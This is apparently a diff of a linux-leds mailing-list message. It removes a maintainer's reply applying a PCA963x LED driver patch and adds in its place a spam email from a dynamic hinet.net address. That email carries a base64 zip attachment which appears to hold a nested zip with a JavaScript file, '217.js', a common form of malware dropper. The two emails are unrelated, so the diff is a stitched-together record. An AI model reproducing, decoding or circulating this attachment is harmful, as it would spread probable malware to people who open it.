@@ -1,113 +1,89 @@
-From: Jacek Anaszewski <jacek.anaszewski@gmail.com>
-Subject: Re: [PATCH v2] leds-pca963x: add bindings to invert polarity
-Date: Thu, 27 Apr 2017 21:01:35 +0200
-Message-ID: <074311fd-8c3b-d0d3-2a7a-c18262cca16d@gmail.com>
-References: <20170427063733.32323-1-anders@chargestorm.se>
+From: <bunny43200@yahoo.com>
+Subject: 6760 linux-leds
+Date: Fri, 28 Apr 2017 17:09:28 -0000
+Message-ID: <149339936819.22260.10464838141298488313@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="9806730.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-leds-owner@vger.kernel.org>
-Received: from mail-wr0-f194.google.com ([209.85.128.194]:34994 "EHLO
-        mail-wr0-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S937311AbdD0TCV (ORCPT
-        <rfc822;linux-leds@vger.kernel.org>); Thu, 27 Apr 2017 15:02:21 -0400
-In-Reply-To: <20170427063733.32323-1-anders@chargestorm.se>
+Received: from 114-45-149-248.dynamic-ip.hinet.net ([114.45.149.248]:40738
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1422829AbdD1RJv (ORCPT
+        <rfc822;linux-leds@vger.kernel.org>); Fri, 28 Apr 2017 13:09:51 -0400
+Content-Disposition: attachment
 Sender: linux-leds-owner@vger.kernel.org
 List-Id: linux-leds@vger.kernel.org
-To: Anders Darander <anders@chargestorm.se>, pavel@ucw.cz, robh+dt@kernel.org, mark.rutland@arm.com, linux-leds@vger.kernel.org, devicetree@vger.kernel.org, linux-kernel@vger.kernel.org
-Cc: rpurdie@rpsys.net
+To: linux-leds@vger.kernel.org
 
-Hi Anders,
-
-On 04/27/2017 08:37 AM, Anders Darander wrote:
-> Add a new DT property, nxp,inverted-out, to invert the polarity of the output.
-> 
-> Tested on PCA9634.
-> 
-> Signed-off-by: Anders Darander <anders@chargestorm.se>
-> ---
->  Documentation/devicetree/bindings/leds/pca963x.txt |  1 +
->  drivers/leds/leds-pca963x.c                        | 17 +++++++++++++++--
->  include/linux/platform_data/leds-pca963x.h         |  6 ++++++
->  3 files changed, 22 insertions(+), 2 deletions(-)
-> 
-> diff --git a/Documentation/devicetree/bindings/leds/pca963x.txt b/Documentation/devicetree/bindings/leds/pca963x.txt
-> index dfbdb123a9bf..4eee41482041 100644
-> --- a/Documentation/devicetree/bindings/leds/pca963x.txt
-> +++ b/Documentation/devicetree/bindings/leds/pca963x.txt
-> @@ -10,6 +10,7 @@ Optional properties:
->  - nxp,period-scale : In some configurations, the chip blinks faster than expected.
->  		     This parameter provides a scaling ratio (fixed point, decimal divided
->  		     by 1000) to compensate, e.g. 1300=1.3x and 750=0.75x.
-> +- nxp,inverted-out: invert the polarity of the generated PWM
->  
->  Each led is represented as a sub-node of the nxp,pca963x device.
->  
-> diff --git a/drivers/leds/leds-pca963x.c b/drivers/leds/leds-pca963x.c
-> index ded1e4dac36a..3bf9a1271819 100644
-> --- a/drivers/leds/leds-pca963x.c
-> +++ b/drivers/leds/leds-pca963x.c
-> @@ -342,6 +342,12 @@ pca963x_dt_init(struct i2c_client *client, struct pca963x_chipdef *chip)
->  	if (of_property_read_u32(np, "nxp,period-scale", &chip->scaling))
->  		chip->scaling = 1000;
->  
-> +	/* default to non-inverted output, unless inverted is specified */
-> +	if (of_property_read_bool(np, "nxp,inverted-out"))
-> +		pdata->dir = PCA963X_INVERTED;
-> +	else
-> +		pdata->dir = PCA963X_NORMAL;
-> +
->  	return pdata;
->  }
->  
-> @@ -452,11 +458,18 @@ static int pca963x_probe(struct i2c_client *client,
->  	i2c_smbus_write_byte_data(client, PCA963X_MODE1, BIT(4));
->  
->  	if (pdata) {
-> +		u8 mode2 = i2c_smbus_read_byte_data(pca963x->chip->client,
-> +						    PCA963X_MODE2);
->  		/* Configure output: open-drain or totem pole (push-pull) */
->  		if (pdata->outdrv == PCA963X_OPEN_DRAIN)
-> -			i2c_smbus_write_byte_data(client, PCA963X_MODE2, 0x01);
-> +			mode2 |= 0x01;
->  		else
-> -			i2c_smbus_write_byte_data(client, PCA963X_MODE2, 0x05);
-> +			mode2 |= 0x05;
-> +		/* Configure direction: normal or inverted */
-> +		if (pdata->dir == PCA963X_INVERTED)
-> +			mode2 |= 0x10;
-> +		i2c_smbus_write_byte_data(pca963x->chip->client, PCA963X_MODE2,
-> +					  mode2);
->  	}
->  
->  	return 0;
-> diff --git a/include/linux/platform_data/leds-pca963x.h b/include/linux/platform_data/leds-pca963x.h
-> index e731f0036329..54e845ffb5ed 100644
-> --- a/include/linux/platform_data/leds-pca963x.h
-> +++ b/include/linux/platform_data/leds-pca963x.h
-> @@ -33,10 +33,16 @@ enum pca963x_blink_type {
->  	PCA963X_HW_BLINK,
->  };
->  
-> +enum pca963x_direction {
-> +	PCA963X_NORMAL,
-> +	PCA963X_INVERTED,
-> +};
-> +
->  struct pca963x_platform_data {
->  	struct led_platform_data leds;
->  	enum pca963x_outdrv outdrv;
->  	enum pca963x_blink_type blink_type;
-> +	enum pca963x_direction dir;
->  };
->  
->  #endif /* __LINUX_PCA963X_H*/
-> 
-
-Thanks for the patch.
-
-Applied to the for-4.13 branch of linux-leds.git.
-
--- 
-Best regards,
-Jacek Anaszewski
+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
